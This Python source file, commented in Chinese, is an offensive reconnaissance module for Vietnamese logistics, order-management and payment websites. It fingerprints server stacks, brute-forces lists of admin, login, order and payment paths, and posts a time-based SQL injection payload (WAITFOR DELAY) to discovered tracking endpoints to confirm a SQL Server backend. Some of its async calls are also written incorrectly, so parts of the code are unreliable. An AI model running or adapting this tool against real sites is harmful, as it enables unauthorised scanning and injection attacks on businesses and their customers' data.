"""
越南化深度指纹识别模块
专门针对越南物流/快递/订单系统的深度指纹识别
"""

import asyncio
import re
import json
import time
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from enum import Enum
import aiohttp
import logging

class TechnologyStack(Enum):
    """技术栈枚举"""
    IIS_ASP_NET = "IIS/ASP.NET"
    JAVA_TOMCAT = "Java/Tomcat"
    PHP_APACHE = "PHP/Apache"
    NODEJS_NGINX = "Node.js/Nginx"
    PYTHON_DJANGO = "Python/Django"
    PYTHON_FLASK = "Python/Flask"

class BusinessType(Enum):
    """业务类型枚举"""
    LOGISTICS_TRACKING = "物流追踪"
    ORDER_MANAGEMENT = "订单管理"
    PAYMENT_GATEWAY = "支付网关"
    WAREHOUSE_SYSTEM = "仓储系统"
    CUSTOMER_PORTAL = "客户门户"

@dataclass
class FingerprintResult:
    """指纹识别结果"""
    target_url: str
    technology_stack: TechnologyStack
    business_type: BusinessType
    vietnamese_indicators: List[str]
    endpoints: Dict[str, List[str]]
    local_assets: List[str]
    third_party_services: List[str]
    database_dialect: str
    confidence_score: float
    metadata: Dict[str, Any]

class VietnameseFingerprinter:
    """越南化深度指纹识别器"""

    def __init__(self):
        self.logger = logging.getLogger(__name__)

        # 越南本地化路径模式
        self.vietnamese_patterns = {
            "scripts": [
                "/Scripts/vi-VN/",
                "/Scripts/vietnamese/",
                "/js/vn/",
                "/assets/js/vi/",
                "/Content/vi-VN/",
                "/i18n/vi/"
            ],
            "css": [
                "/Content/themes/vietnam/",
                "/css/vi-VN/",
                "/styles/vietnamese/",
                "/assets/css/vi/"
            ],
            "images": [
                "/img/logo-vn.png",
                "/images/vietnam/",
                "/assets/images/vi/",
                "/Content/images/vn/",
                "/images/logo-viettel.png",
                "/images/vnpost-logo.png"
            ],
            "fonts": [
                "/fonts/vietnamese/",
                "/fonts/uvn-",
                "/assets/fonts/vi/",
                "/Content/fonts/vn/"
            ]
        }

        # 业务端点模式
        self.logistics_endpoints = {
            "tracking": [
                "/TraCuuDonHang",
                "/Tracking",
                "/TrackAndTrace",
                "/TrackParcel",
                "/Tracking.aspx",
                "/TrackOrder",
                "/don-hang/tra-cuu",
                "/van-don/tim-kiem",
                "/api/tracking",
                "/api/v1/tracking",
                "/App_API/Tracking",
                "/VanDon/Tracking",
                "/DonHang/Search",
                "/QuanLyDonHang/Tracking"
            ],
            "management": [
                "/QuanLyDonHang",
                "/OrderManagement",
                "/OrderAdmin",
                "/DonHang/QuanLy",
                "/VanDon/QuanLy",
                "/api/orders",
                "/api/v1/orders",
                "/api/parcels"
            ],
            "customer": [
                "/KhachHang",
                "/Customer",
                "/TaiKhoan",
                "/account",
                "/profile",
                "/dang-nhap",
                "/login",
                "/dang-ky",
                "/register"
            ],
            "payment": [
                "/ThanhToan",
                "/Payment",
                "/api/payment",
                "/vnpay",
                "/momo",
                "/nganluong"
            ]
        }

        # 越南第三方服务标识
        self.vn_third_party = [
            "viettelpost.vn",
            "vnpost.vn",
            "giaohangnhanh.vn",
            "j&t.vn",
            "ghtk.vn",
            "shipchung.vn",
            "vnpay.vn",
            "momo.vn",
            "nganluong.vn",
            "map4d.vn",
            "vnmap.vn",
            "zingmp3.vn",
            "cafef.vn"
        ]

        # SQL Server 方言检测payload
        self.sqlserver_payloads = [
            "N'",  # Unicode字符串前缀
            "Lỗi",  # 越南语错误信息
            "chuyển đổi kiểu dữ liệu",  # 类型转换错误
            "Microsoft SQL Server",
            "SQL Server",
            "ASP.NET"
        ]

    async def fingerprint(self, session: aiohttp.ClientSession, target_url: str) -> FingerprintResult:
        """执行深度指纹识别"""
        self.logger.info(f"开始对 {target_url} 进行越南化指纹识别...")

        start_time = time.time()

        # 1. 技术栈识别
        tech_stack = await self._detect_technology_stack(session, target_url)

        # 2. 业务类型识别
        business_type = await self._detect_business_type(session, target_url)

        # 3. 越南本地化检测
        vietnamese_indicators = await self._detect_vietnamese_localization(session, target_url)

        # 4. 业务端点发现
        endpoints = await self._discover_business_endpoints(session, target_url)

        # 5. 本地资产扫描
        local_assets = await self._scan_local_assets(session, target_url)

        # 6. 第三方服务识别
        third_party_services = await self._identify_third_party_services(session, target_url)

        # 7. 数据库方言检测
        database_dialect = await self._probe_database_dialect(session, target_url, endpoints)

        # 计算置信度分数
        confidence_score = self._calculate_confidence(
            tech_stack, business_type, vietnamese_indicators, database_dialect
        )

        execution_time = time.time() - start_time

        result = FingerprintResult(
            target_url=target_url,
            technology_stack=tech_stack,
            business_type=business_type,
            vietnamese_indicators=vietnamese_indicators,
            endpoints=endpoints,
            local_assets=local_assets,
            third_party_services=third_party_services,
            database_dialect=database_dialect,
            confidence_score=confidence_score,
            metadata={
                "execution_time": execution_time,
                "endpoints_count": sum(len(endpoints[k]) for k in endpoints),
                "vietnamese_score": len(vietnamese_indicators),
                "business_functions": list(endpoints.keys())
            }
        )

        self.logger.info(f"指纹识别完成，置信度: {confidence_score:.2%}")
        return result

    async def _detect_technology_stack(self, session: aiohttp.ClientSession, url: str) -> TechnologyStack:
        """识别目标技术栈"""
        try:
            # 发送请求获取headers和内容
            async with session.get(url, timeout=10) as response:
                headers = dict(response.headers)
                content = await response.text()

                # 检测ASP.NET/IIS
                if 'X-Powered-By' in headers and 'ASP.NET' in headers['X-Powered-By']:
                    return TechnologyStack.IIS_ASP_NET

                if 'X-ASPNET-VERSION' in headers:
                    return TechnologyStack.IIS_ASP_NET

                if 'Microsoft-IIS' in headers.get('Server', ''):
                    return TechnologyStack.IIS_ASP_NET

                # 检测Java/Tomcat
                if 'Tomcat' in headers.get('Server', ''):
                    return TechnologyStack.JAVA_TOMCAT

                if 'X-Powered-By' in headers and 'JSP' in headers['X-Powered-By']:
                    return TechnologyStack.JAVA_TOMCAT

                # 检测PHP
                if 'PHP/' in headers.get('X-Powered-By', ''):
                    return TechnologyStack.PHP_APACHE

                # 检测Node.js
                if 'Node.js' in headers.get('X-Powered-By', ''):
                    return TechnologyStack.NODEJS_NGINX

                # 检测Django
                if 'Django' in headers.get('X-Powered-By', ''):
                    return TechnologyStack.PYTHON_DJANGO

                # 检测Flask
                if 'Flask' in headers.get('Server', ''):
                    return TechnologyStack.PYTHON_FLASK

                # 默认返回ASP.NET（越南常见）
                return TechnologyStack.IIS_ASP_NET

        except Exception as e:
            self.logger.warning(f"技术栈识别失败: {e}")
            return TechnologyStack.IIS_ASP_NET  # 默认假设为ASP.NET

    async def _detect_business_type(self, session: aiohttp.ClientSession, url: str) -> BusinessType:
        """识别业务类型"""
        try:
            # 获取页面内容进行分析
            async with session.get(url, timeout=10) as response:
                content = await response.text().lower()

                # 检查业务关键词
                tracking_keywords = ["tracking", "track", "追踪", "运单", "订单号", "đơn hàng"]
                order_keywords = ["order", "đơn hàng", "订单", "管理", "admin"]
                payment_keywords = ["payment", "thanh toán", "支付", "vnpay", "momo"]
                warehouse_keywords = ["warehouse", "kho", "仓储", "库存"]

                scoring = {
                    BusinessType.LOGISTICS_TRACKING: sum(1 for kw in tracking_keywords if kw in content),
                    BusinessType.ORDER_MANAGEMENT: sum(1 for kw in order_keywords if kw in content),
                    BusinessType.PAYMENT_GATEWAY: sum(1 for kw in payment_keywords if kw in content),
                    BusinessType.WAREHOUSE_SYSTEM: sum(1 for kw in warehouse_keywords if kw in content),
                    BusinessType.CUSTOMER_PORTAL: sum(1 for kw in ["customer", "user", "khách hàng", "tài khoản"] if kw in content)
                }

                return max(scoring, key=scoring.get)

        except Exception as e:
            self.logger.warning(f"业务类型识别失败: {e}")
            return BusinessType.LOGISTICS_TRACKING  # 默认为物流追踪

    async def _detect_vietnamese_localization(self, session: aiohttp.ClientSession, url: str) -> List[str]:
        """检测越南本地化特征"""
        indicators = []

        try:
            # 检查页面内容中的越南语
            async with session.get(url, timeout=10) as response:
                content = await response.text()

                # 越南语检测
                vietnamese_chars = re.findall(r'[àáạảãâầấậẩẫăằắặẳẵèéẹẻẽêềếệểễìíịỉĩòóọỏõôồốộổỗơờớợởỡùúụủũưừứựửữỳỵỷỹđÀÁẠẢÃÂẦẤẬẨẪĂẰẮẶẲẴÈÉẸẺẼÊỀẾỆỂỄÌÍỊỈĨÒÓỌỎÕÔỒỐỘỔỖƠỜỚỢỞỠÙÚỤỦŨƯỪỨỰỬỮỲỴỶỸĐ]', content)

                if vietnamese_chars:
                    indicators.append("越南语字符检测")

                # 检查越南语关键词
                vietnamese_keywords = [
                    "đơn hàng", "vận đơn", "giao hàng", "địa chỉ",
                    "khách hàng", "thanh toán", "tổng đài",
                    "liên hệ", "giá vận chuyển", "thời gian giao"
                ]

                for keyword in vietnamese_keywords:
                    if keyword in content.lower():
                        indicators.append(f"越南语关键词: {keyword}")

        except Exception as e:
            self.logger.warning(f"越南本地化检测失败: {e}")

        return indicators

    async def _discover_business_endpoints(self, session: aiohttp.ClientSession, url: str) -> Dict[str, List[str]]:
        """发现业务端点"""
        endpoints = {category: [] for category in self.logistics_endpoints.keys()}

        try:
            base_domain = url.split('//')[1].split('/')[0]

            # 测试每个业务端点
            for category, endpoint_list in self.logistics_endpoints.items():
                for endpoint in endpoint_list:
                    test_url = f"{url.rstrip('/')}{endpoint}"
                    try:
                        async with session.head(test_url, timeout=5) as response:
                            if response.status < 500:
                                endpoints[category].append(test_url)
                    except:
                        pass

        except Exception as e:
            self.logger.warning(f"业务端点发现失败: {e}")

        return endpoints

    async def _scan_local_assets(self, session: aiohttp.ClientSession, url: str) -> List[str]:
        """扫描本地化资产"""
        found_assets = []

        try:
            base_domain = url.split('//')[1].split('/')[0]

            # 扫描越南本地化路径
            for asset_type, paths in self.vietnamese_patterns.items():
                for path in paths:
                    test_url = f"{url.rstrip('/')}{path}"
                    try:
                        async with session.head(test_url, timeout=5) as response:
                            if response.status == 200:
                                found_assets.append(test_url)
                    except:
                        pass

        except Exception as e:
            self.logger.warning(f"本地资产扫描失败: {e}")

        return found_assets

    async def _identify_third_party_services(self, session: aiohttp.ClientSession, url: str) -> List[str]:
        """识别第三方服务"""
        services = []

        try:
            content = await session.get(url, timeout=10).text()

            # 检查脚本中的第三方服务
            script_patterns = [
                r'src="[^"]*viettelpost[^"]*"',
                r'src="[^"]*vnpost[^"]*"',
                r'src="[^"]*giaohangnhanh[^"]*"',
                r'src="[^"]*vnpay[^"]*"',
                r'src="[^"]*momo[^"]*"',
                r'api\.viettelpost\.vn',
                r'api\.vnpost\.vn',
                r'pay\.vnpay\.vn'
            ]

            for pattern in script_patterns:
                matches = re.findall(pattern, content)
                services.extend(matches)

            # 检查地图服务
            if any(map_service in content for map_service in ['map4d.vn', 'vnmap.vn', 'google']):
                services.append("地图服务检测")

        except Exception as e:
            self.logger.warning(f"第三方服务识别失败: {e}")

        return services

    async def _probe_database_dialect(self, session: aiohttp.ClientSession, url: str, endpoints: Dict[str, List[str]]) -> str:
        """探测数据库方言"""
        # 首先检查是否在错误信息中能识别出数据库类型
        try:
            # 使用追踪端点进行测试
            if endpoints.get('tracking'):
                tracking_url = endpoints['tracking'][0]
                # 尝试注入一个会产生错误信息的payload
                test_data = {"MaDonHang": "'; WAITFOR DELAY '0:0:2' --"}

                start_time = time.time()
                async with session.post(tracking_url, data=test_data, timeout=10) as response:
                    response_time = time.time() - start_time

                if response_time > 1.5:
                    return "SQL Server (时间延迟检测)"

            # 检查ASP.NET特定的错误页面
            error_patterns = [
                "Lỗi chuyển đổi kiểu dữ liệu",
                "Microsoft SQL Server",
                "SQL Server",
                "ASP.NET"
            ]

            try:
                async with session.get(url, timeout=10) as response:
                    content = await response.text()

                for pattern in error_patterns:
                    if pattern in content:
                        return f"SQL Server ({pattern} 检测)"

            except Exception:
                pass

        except Exception as e:
            self.logger.warning(f"数据库方言探测失败: {e}")

        return "未知/需要进一步确认"

    def _calculate_confidence(self, tech_stack: TechnologyStack, business_type: BusinessType,
                           vietnamese_indicators: List[str], database_dialect: str) -> float:
        """计算置信度分数"""
        score = 0.0

        # 技术栈匹配 (越南常见)
        if tech_stack == TechnologyStack.IIS_ASP_NET:
            score += 0.4
        elif tech_stack in [TechnologyStack.JAVA_TOMCAT, TechnologyStack.PHP_APACHE]:
            score += 0.2

        # 业务类型匹配
        if business_type == BusinessType.LOGISTICS_TRACKING:
            score += 0.3
        elif business_type in [BusinessType.ORDER_MANAGEMENT, BusinessType.CUSTOMER_PORTAL]:
            score += 0.2

        # 越南本地化指标
        score += min(len(vietnamese_indicators) * 0.1, 0.2)

        # 数据库方言确认
        if "SQL Server" in database_dialect:
            score += 0.1

        return min(score, 1.0)